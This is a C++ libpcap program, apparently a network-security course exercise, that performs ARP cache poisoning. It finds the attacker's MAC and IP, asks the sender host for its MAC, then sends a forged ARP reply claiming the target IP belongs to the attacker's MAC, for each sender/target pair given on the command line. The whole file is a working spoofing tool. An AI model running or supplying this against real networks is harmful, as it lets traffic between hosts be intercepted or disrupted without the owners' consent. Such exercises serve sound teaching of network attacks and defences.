#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct AttackerMacIp {
	char macAddr[18];
	char ipAddr[16];
};

struct STMacIp {
	Mac mac;
	Ip ip;
};

AttackerMacIp AttMacIp;
// STMacIp GWMacIp;
STMacIp SDIp;

#pragma pack(pop)

AttackerMacIp getAttackMacIp(char* ifaceName) {
	struct ifreq ifr;
	int sockFd, ret;

	// 소켓 생성
    sockFd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockFd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

	// 인터페이스 이름 설정
    memset(&ifr, 0, sizeof(ifreq));
    strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);

    // MAC 주소 가져오기
    if (ioctl(sockFd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl - get mac");
        close(sockFd);
        exit(EXIT_FAILURE);
    }

    // MAC 주소를 문자열로 변환
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    snprintf(AttMacIp.macAddr, sizeof(AttMacIp.macAddr),
             "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	// IP 주소 가져오기
	if (ioctl(sockFd, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl - get ip");
		close(sockFd);
		exit(EXIT_FAILURE);
	}

	// IP 주소를 문자열로 변환
	struct sockaddr_in* ip = (struct sockaddr_in*)&ifr.ifr_addr;
	strncpy(AttMacIp.ipAddr, inet_ntoa(ip->sin_addr), sizeof(AttMacIp.ipAddr) - 1);
	AttMacIp.ipAddr[sizeof(AttMacIp.ipAddr) - 1] = '\0';

	close(sockFd);

    return AttMacIp;
}

STMacIp getMacIp(pcap_t* pcap, STMacIp* macIp, char* senderIp, char* targetIp) {
	
	EthArpPacket packet;

	packet.eth_.smac_ = Mac(AttMacIp.macAddr);
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(AttMacIp.macAddr);
	packet.arp_.sip_ = htonl(Ip(senderIp));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(targetIp));

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	struct pcap_pkthdr* header;
    const uint8_t* recv_packet;

	while (true){
		int recv_res = pcap_next_ex(pcap, &header, &recv_packet);
		if ((recv_res == PCAP_ERROR) || (recv_res == PCAP_ERROR_BREAK)) {
			printf("pcap_next_ex return %d(%s)\n", recv_res, pcap_geterr(pcap));
			break;
		}
		const EthHdr* pEthHdr = reinterpret_cast<const EthHdr*>(recv_packet);
		if (ntohs(pEthHdr->type_) == EthHdr::Arp) {
			const ArpHdr* aRpHdr = reinterpret_cast<const ArpHdr*>(recv_packet + sizeof(EthHdr));
			macIp->mac = aRpHdr->smac_;
			macIp->ip = aRpHdr->sip_;
			if ((Ip(macIp->ip)) != htonl(Ip(targetIp))) continue;
		} else {
			continue;
		}
		break;
	}

	return *macIp;
}

int attackPacket(char* dev, char* senderIp, char* targetIp) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}
	// 공격자의 mac, ip 주소 구하기
	getAttackMacIp(dev);
	printf("attacker mac is %s\n", AttMacIp.macAddr);
	printf("attacker ip is %s\n", AttMacIp.ipAddr);

	// sender ip , target ip를 전달하면 그에 따른 mac을 얻을 수 있도록 ...
	/*
	getMacIp(pcap, &GWMacIp, senderIp, targetIp);
	
	const u_char* GWMac = reinterpret_cast<const u_char*>(&GWMacIp.mac);
	printf("gateway mac is %02x:%02x:%02x:%02x:%02x:%02x\n", GWMac[0], GWMac[1], GWMac[2], GWMac[3], GWMac[4], GWMac[5]);
	printf("gateway ip is %d.%d.%d.%d\n",ntohl(GWMacIp.ip << 24)&0xFF,ntohl(GWMacIp.ip << 16)&0xFF,ntohl(GWMacIp.ip << 8)&0xFF,ntohl(GWMacIp.ip)&0xFF);
	*/
	getMacIp(pcap, &SDIp, targetIp, senderIp);

	const u_char* SDMac = reinterpret_cast<const u_char*>(&SDIp.mac);
	printf("sender mac is %02x:%02x:%02x:%02x:%02x:%02x\n", SDMac[0], SDMac[1], SDMac[2], SDMac[3], SDMac[4], SDMac[5]);
	printf("sender ip is %d.%d.%d.%d\n",ntohl(SDIp.ip << 24)&0xFF,ntohl(SDIp.ip << 16)&0xFF,ntohl(SDIp.ip << 8)&0xFF,ntohl(SDIp.ip)&0xFF);
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(SDIp.mac);
	packet.eth_.smac_ = Mac(AttMacIp.macAddr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(AttMacIp.macAddr);
	packet.arp_.sip_ = htonl(Ip(targetIp));
	packet.arp_.tmac_ = Mac(SDIp.mac);
	packet.arp_.tip_ = Ip(SDIp.ip);

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	pcap_close(pcap);
	return EXIT_SUCCESS;
}

int main(int argc, char* argv[]) {
	char* dev = argv[1];
	if ((argc - 1) % 2 == 0) return -1;
	printf("dev = %s num = %d\n", dev, argc);
	for (int i = 2; i < argc; i += 2) {
		if(attackPacket(dev, argv[i], argv[i + 1])) return -1;
	}
}
